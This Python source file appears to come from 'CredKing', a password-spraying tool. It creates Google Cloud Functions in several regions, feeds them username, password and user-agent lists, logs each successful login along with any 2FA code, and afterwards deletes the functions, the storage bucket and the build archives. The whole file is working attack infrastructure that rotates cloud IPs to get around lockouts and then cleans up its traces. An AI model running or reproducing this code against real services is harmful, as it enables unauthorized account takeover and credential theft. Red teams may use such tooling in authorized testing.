#!/usr/bin/python3
from googleapiclient.discovery import build
from google.oauth2 import service_account
from google.cloud import storage
from time import time
from concurrent.futures import ThreadPoolExecutor
from pprint import pprint
from threading import Lock, Thread
import json, sys, random, string, ntpath, time, os, datetime, queue, shutil
import re, argparse, importlib
from credking_core import log_entry
from credking_core import generate_random

_service_account_email = ""

lock = Lock()


def clear_credentials(username, password):
    global credentials
    c = {}
    c['accounts'] = []
    for x in credentials['accounts']:
        if not x['username'] == username:
            x['success'] = True
            c['accounts'].append(x)
    credentials = c


def start_spray(sa_credentials, function_name, args, item):
    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
    function = service.projects().locations().functions()
    if item is None:
        return

    payload = {}
    payload['username'] = item['username']
    payload['password'] = item['password']
    payload['useragent'] = item['useragent']
    payload['args'] = args
    body = {"data": json.dumps(payload)}
    invoke_function(function, function_name, body)


def create_functions(sa_credentials, locations, project_id, source_url, thread_count):
    # Get Locations
    locations_response = locations.list(name=f'projects/{project_id}').execute()
    location_names = ["us-central1", "us-east1", "us-east4", "europe-west1", "asia-east2"]
    # log_entry(len(locations_response['locations']))
    log_entry(len(location_names))
    # print(json.dumps(locations,indent=2))
    threads = thread_count

    if thread_count > len(location_names):
        threads = len(location_names)
    # Commenting out as this checked for earlier
    '''
    elif thread_count > len(credentials['accounts']):
        threads = len(credentials['accounts'])
    '''
    log_entry(f"Number of functions to be created: {threads}")
    function_names = []
    function = locations.functions()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for x in range(0, threads):
            function_names.append(
                executor.submit(
                    create_function,
                    sa_credentials=sa_credentials,
                    project_id=project_id,
                    source_url=source_url,
                    location=location_names[x]
                )
            )
    for x in function_names:
        log_entry(x.result())
    return [x.result() for x in function_names]


def check_function(function, function_name):
    # Get Status of the function and make sure that it is active
    while True:
        sleep = 5
        status = function.get(name=function_name).execute()
        if status['status'] == 'ACTIVE':
            break
        else:
            log_entry(f"Waiting {sleep} seconds for function to become ACTIVE")
            time.sleep(sleep)
    log_entry(f"Created Function: {function_name}")


def create_zip(plugin):
    plugin_path = 'plugins/{}/'.format(plugin)
    random_name = next(generate_random())
    build_zip = 'build/{}_{}.zip'.format(plugin, random_name)

    with lock:
        log_entry('Creating build deployment for plugin: {}'.format(plugin))
        shutil.make_archive(build_zip[0:-4], 'zip', plugin_path)

    return build_zip


def create_bucket(bucket, plugin):
    path = create_zip(plugin)
    blob = bucket.blob('test.zip')
    blob.upload_from_filename(path)
    object_url = f'gs://{blob.bucket.name}/{blob.name}'
    return object_url


def create_function(sa_credentials, project_id, source_url, location):
    service = build('cloudfunctions', 'v1', credentials=sa_credentials)
    # Calling the create function command
    log_entry(location)
    f_name = f'credking-function-{next(generate_random())}'
    # function_name = f"{locations_response['locations'][x]['name']}/functions/{f_name}"
    location_name = f"projects/{project_id}/locations/{location}"
    function_name = f"{location_name}/functions/{f_name}"
    log_entry(function_name)
    log_entry(f"Creating Function: {function_name}")

    # Create Function
    body = {
        "name": function_name,
        "availableMemoryMb": 128,
        "entryPoint": "lambda_handler",
        "description": "CredKing Function",
        "timeout": "60s",
        "runtime": "python37",
        "ingressSettings": "ALLOW_ALL",
        "maxInstances": 1,
        "sourceArchiveUrl": source_url,
        "httpsTrigger": {},
        "vpcConnector": "",
        "serviceAccountEmail": _service_account_email
    }
    function = service.projects().locations().functions()
    function_resp = function.create(location=location_name, body=body).execute()
    log_entry(f"Function Resp: {function_resp}")

    return function_name


def invoke_function(function, function_name, payload):
    response = function.call(name=function_name, body=payload).execute()
    return_payload = json.loads(response['result'])

    user, password = return_payload['username'], return_payload['password']
    code_2fa = return_payload['code']
    if return_payload['success']:
        # clear_credentials(user, password)
        log_entry('(SUCCESS) {} / {} -> Success! (2FA: {})'.format(user, password, code_2fa))
    else:
        log_entry('(FAILED) {} / {} -> Failed.'.format(user, password))


def delete_function(function, function_name):
    # Delete Function
    log_entry(function.delete(name=function_name).execute())


def delete_bucket(bucket):
    # Delete Code
    blob = bucket.blob('test.zip')
    blob.delete()
    bucket.delete()


def delete_zip():
    # Delete Zip
    file_list = [f for f in os.listdir('build') if f.endswith(".zip")]
    for f in file_list:
        os.remove(os.path.join('build', f))
        log_entry(f"Removing file {f}")
